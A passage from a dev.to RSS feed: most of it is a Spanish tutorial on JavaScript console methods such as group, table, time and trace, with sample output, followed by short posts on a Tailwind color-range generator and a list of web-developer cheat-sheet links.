&lt;p&gt;Muestra la misma información que dir, pero en formato XML.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#error"&gt;
  &lt;/a&gt;
  error()
&lt;/h2&gt;

&lt;p&gt;Este método nos permite mostrar un mensaje de error en la consola. A simple vista, puede parecernos igual a console.log(), pero la diferencia es que mientras console.log() escribe mediante stdout, console.error() escribe a stderr, lo que nos permite utilizarlos de manera diferente. Les recomiendo correr este código en Node y en la consola de Chrome para ver la diferencia de manejo.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;console.error('Error reading data');
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#group-y-groupend"&gt;
  &lt;/a&gt;
  group() y groupEnd()
&lt;/h2&gt;

&lt;p&gt;este método nos permite crear indentaciones en nuestros logs, mediante agrupaciones. Utilizaremos group() para abrir un nivel y groupEnd() para cerrarlo.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;console.log('Nivel base');
console.group();
console.log('Nivel 1');
console.group();
console.log('Nivel 2');
console.group();
console.log('Nivel 3');
console.groupEnd();
console.log('Nivel 2');
console.groupEnd();
console.log('Nivel 1');
console.groupEnd();

---------------------------
Nivel base
  Nivel 1
    Nivel 2
      Nivel 3
    Nivel 2
  Nivel 1
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#groupcollapsed"&gt;
  &lt;/a&gt;
  groupCollapsed()
&lt;/h2&gt;

&lt;p&gt;Este método nos permite crear un grupo desplegable, el cual al imprimirse por consola nos permitirá abrirlo y cerrarlo. Recomiendo probar esta funcionalidad en la consola del navegador.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;console.log('Nivel base');
console.groupCollapsed('Ver más');
console.log('Nivel 1');
console.group();
console.log('Nivel 2');
console.group();
console.log('Nivel 3');
console.groupEnd();
console.log('Nivel 2');
console.groupEnd();
console.log('Nivel 1');
console.groupEnd();

-----------------------------
Nivel base
VM64:2 Ver más
VM64:3 Nivel 1
VM64:4 console.group
VM64:5 Nivel 2
VM64:6 console.group
VM64:7 Nivel 3
VM64:9 Nivel 2
VM64:11 Nivel 1
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#info"&gt;
  &lt;/a&gt;
  info()
&lt;/h2&gt;

&lt;p&gt;Este método muestra como salida un mensaje de información a la consola. Normalmente, aparece un icono con una 'i' para indicar esto.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;console.info('Este es un mensaje informativo');
VM154:1 Este es un mensaje informativo
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#log"&gt;
  &lt;/a&gt;
  log()
&lt;/h2&gt;

&lt;p&gt;Como hablamos al comienzo, uno de los primeros métodos que aprendemos. Veamos algunas funciones extra que tiene.&lt;/p&gt;

&lt;p&gt;Podemos utilizar sustituciones dentro del string, para imprimir determinados tipos de valores.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;let celular = {
    codArea: 54,
    prefijo: 11,
    numero: 12345687
};

let duracion = 5.6;

for (let i = 0; i &amp;lt; 5; i++) {

    console.log("Hola, %s, este es el mensaje número %d al teléfono %o, con una duración de %f segundos", "Cristian",i+1, celular, duracion);

}
--------------------------------------
Hola, Cristian, este es el mensaje número 1 al teléfono { codArea: 54, prefijo: 11, numero: 12345687 }, con una duración de 5.6 segundos
Hola, Cristian, este es el mensaje número 2 al teléfono { codArea: 54, prefijo: 11, numero: 12345687 }, con una duración de 5.6 segundos
Hola, Cristian, este es el mensaje número 3 al teléfono { codArea: 54, prefijo: 11, numero: 12345687 }, con una duración de 5.6 segundos
Hola, Cristian, este es el mensaje número 4 al teléfono { codArea: 54, prefijo: 11, numero: 12345687 }, con una duración de 5.6 segundos
Hola, Cristian, este es el mensaje número 5 al teléfono { codArea: 54, prefijo: 11, numero: 12345687 }, con una duración de 5.6 segundos
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Otra funcionalidad interesante es dar estilos a nuestros mensajes. Podemos aplicar estilos a nuestra salida de consola para que sea mas atractiva, o según lo que deseemos resaltar.&lt;br&gt;
Tenemos dos formas de realizar esto según donde mostraremos nuestro mensaje.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;//navegador
console.log("%cError detectado","color: yellow; font-style: italic; background-color: black");

//node
console.log('\x1b[31m%s\x1b[0m', 'Error detectado');
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Nota: en el caso de Node, existen paquetes como &lt;a href="https://www.npmjs.com/package/colors"&gt;colors&lt;/a&gt; para simplificarnos la tarea.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#table"&gt;
  &lt;/a&gt;
  table()
&lt;/h2&gt;

&lt;p&gt;este método nos permite imprimir una tabla con valores por consola. Debemos pasarle por argumento un array o un objeto&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const persona = {
    nombre: 'Cristian',
    apellido: 'Bonomo'
};

console.table(persona);

const lenguajes = ['Javascript','PHP','Java','Python'];

console.table(lenguajes);

----------------------------------
┌──────────┬────────────┐
│ (index)  │   Values   │
├──────────┼────────────┤
│  nombre  │ 'Cristian' │
│ apellido │  'Bonomo'  │
└──────────┴────────────┘
┌─────────┬──────────────┐
│ (index) │    Values    │
├─────────┼──────────────┤
│    0    │ 'Javascript' │
│    1    │    'PHP'     │
│    2    │    'Java'    │
│    3    │   'Python'   │
└─────────┴──────────────┘
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#time"&gt;
  &lt;/a&gt;
  time()
&lt;/h2&gt;

&lt;p&gt;Este método nos permite registrar cuanto tiempo puede tomar una operación en específico. Vamos a utilizarlo en conjunto con timeLog(), el cual nos permite ver el valor actual de un timer previamente inicializado, y timeEnd(), el cual frena el timer.&lt;br&gt;
Para este caso, voy a simular una función init(), que solo realizara un conteo, pero también podría ser una métrica de cuanto tiempo toma el sistema para inicializar, o responder a una petición.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;function init() {
    let count = 0;
    for (let i = 0; i &amp;lt; 100; i++) {
        count++;
    }
}

console.time('init');
init();
console.timeLog('init');
init();
console.timeEnd('init');

--------------------------------------
init: 0.092ms
init: 0.276ms
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#trace"&gt;
  &lt;/a&gt;
  trace()
&lt;/h2&gt;

&lt;p&gt;Este método nos permite realizar un trace sobre las funciones llamadas hasta el punto en que llamamos a trace()&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;function funcionUno() {
    function funcionDos() {
        console.trace();
    }
    funcionDos();
}

funcionUno();

Trace
    at funcionDos (/home/cbonomo/Javascript/01-fundamentos/console.js:133:17)
    at funcionUno (/home/cbonomo/Javascript/01-fundamentos/console.js:135:5)
    at Object.&amp;lt;anonymous&amp;gt; (/home/cbonomo/Cursos/Javascript/01-fundamentos/console.js:138:1)
    at Module._compile (node:internal/modules/cjs/loader:1095:14)
    at Object.Module._extensions..js (node:internal/modules/cjs/loader:1147:10)
    at Module.load (node:internal/modules/cjs/loader:975:32)
    at Function.Module._load (node:internal/modules/cjs/loader:822:12)
    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:81:12)
    at node:internal/main/run_main_module:17:47
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#warn"&gt;
  &lt;/a&gt;
  warn()
&lt;/h2&gt;

&lt;p&gt;Este método nos permite mostrar un mensaje de alerta en la consola web. En esta consola, nos mostrará el mensaje junto con el símbolo amarillo de warning.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;console.warn('Este es un mensaje de alerta');
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Así, llegamos al final de este repaso por los métodos que nos ofrece la clase console(), espero les sea de utilidad a la hora de programar, para mostrar mejores mensajes por consola y poder implementar mas fácilmente las soluciones que necesiten en su desarrollo.&lt;/p&gt;

&lt;p&gt;Hasta la próxima!&lt;/p&gt;

</description>
      <category>javascript</category>
      <category>node</category>
      <category>programming</category>
      <category>spanish</category>
    </item>
    <item>
      <title>highsea : color range generator for tailwindcss</title>
      <author>Nostro</author>
      <pubDate>Fri, 24 Dec 2021 17:10:08 +0000</pubDate>
      <link>https://dev.to/nostro/highsea-color-range-generator-for-tailwindcss-4kcb</link>
      <guid>https://dev.to/nostro/highsea-color-range-generator-for-tailwindcss-4kcb</guid>
      <description>&lt;p&gt;If you like using tailwindcss, every now and then you find yourself in the position of wanting to use a specific shade, but no default color in the tailwindcss range does fit the bill, it's too greenish or to reddish or too whatnot - it just doesn't work.&lt;/p&gt;

&lt;p&gt;From there, either you build your own range manually, or find some some code somewhere that generate them.&lt;/p&gt;

&lt;p&gt;I didn't find anything easy enough for my liking, so I built it.&lt;/p&gt;

&lt;p&gt;Here comes &lt;a href="https://highsea.nostrorom.com"&gt;highsea&lt;/a&gt;, it's very barebones for now in terms of features, but it nails the heart of the matter: generate a 50-900 range for any hue, while still fitting with the existing range should you want to combine custom and default on the same project.&lt;/p&gt;

&lt;p&gt;More features will be added later on; in the meantime enjoy ! &lt;/p&gt;

</description>
      <category>tailwindcss</category>
      <category>webdev</category>
      <category>svelte</category>
      <category>javascript</category>
    </item>
    <item>
      <title>Cheat Sheets for Web Developers</title>
      <author>Alexandru Bereghici</author>
      <pubDate>Fri, 24 Dec 2021 17:06:22 +0000</pubDate>
      <link>https://dev.to/abereghici/cheat-sheets-for-web-developers-57en</link>
      <guid>https://dev.to/abereghici/cheat-sheets-for-web-developers-57en</guid>
      <description>&lt;p&gt;The front-end development evolves with incredible speed. Now it's a challenge to remember all the syntax, methods, or commands of a programming language, framework, or library. Here is where cheat sheets come in. They are great, intuitive resources that help you quickly find what you need.&lt;/p&gt;

&lt;p&gt;In this post, I want to share some of the most useful cheat sheets or references I've found it, and I use it daily.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#accessibility"&gt;
  &lt;/a&gt;
  Accessibility
&lt;/h4&gt;

&lt;p&gt;&lt;a href="https://learn-the-web.algonquindesign.ca/topics/accessibility-cheat-sheet/"&gt;https://learn-the-web.algonquindesign.ca/topics/accessibility-cheat-sheet&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://lab.abhinayrathore.com/aria-cheatsheet/"&gt;https://lab.abhinayrathore.com/aria-cheatsheet&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.w3.org/TR/wai-aria-practices/"&gt;https://www.w3.org/TR/wai-aria-practices&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#html"&gt;
  &lt;/a&gt;
  HTML
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://digital.com/tools/html-cheatsheet/"&gt;https://digital.com/tools/html-cheatsheet&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://htmlreference.io/"&gt;https://htmlreference.io&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://quickref.me/html"&gt;https://quickref.me/html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://dev.w3.org/html5/html-author/"&gt;https://dev.w3.org/html5/html-author&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#css"&gt;
  &lt;/a&gt;
  CSS
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://cssreference.io/"&gt;https://cssreference.io&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://quickref.me/css"&gt;https://quickref.me/css&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://devdocs.io/css/"&gt;https://devdocs.io/css&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.30secondsofcode.org/css/p/1"&gt;CSS Snippets&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://grid.malven.co/"&gt;Grid - A simple visual cheatsheet for CSS Grid Layout&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://flexbox.malven.co/"&gt;Flex - A simple visual cheatsheet for flexbox&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#javascript"&gt;
  &lt;/a&gt;
  Javascript
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://www.30secondsofcode.org/"&gt;JavaScript Snippets&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://javascript.info/"&gt;https://javascript.info&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.javascripttutorial.net/es-next/"&gt;https://www.javascripttutorial.net/es-next&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference"&gt;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#typescript"&gt;
  &lt;/a&gt;
  Typescript
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://rmolinamir.github.io/typescript-cheatsheet/"&gt;https://rmolinamir.github.io/typescript-cheatsheet&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://github.com/sindresorhus/type-fest"&gt;https://github.com/sindresorhus/type-fest&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.freecodecamp.org/news/advanced-typescript-types-cheat-sheet-with-examples/"&gt;https://www.freecodecamp.org/news/advanced-typescript-types-cheat-sheet-with-examples&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.sitepen.com/blog/typescript-cheat-sheet"&gt;https://www.sitepen.com/blog/typescript-cheat-sheet&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#git"&gt;
  &lt;/a&gt;
  Git
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://gitexplorer.com/"&gt;Git Command Explorer&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.30secondsofcode.org/git/p/1"&gt;Git Snippets&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#design-patterns"&gt;
  &lt;/a&gt;
  Design Patterns
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://www.patterns.dev/posts/"&gt;https://www.patterns.dev/posts&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://refactoring.guru/design-patterns"&gt;https://refactoring.guru/design-patterns&lt;/a&gt;&lt;/p&gt;

</description>
      <category>webdev</category>
      <category>cheatsheet</category>
      <category>productivity</category>
      <category>programming</category>
    </item>
  </channel>
</rss>
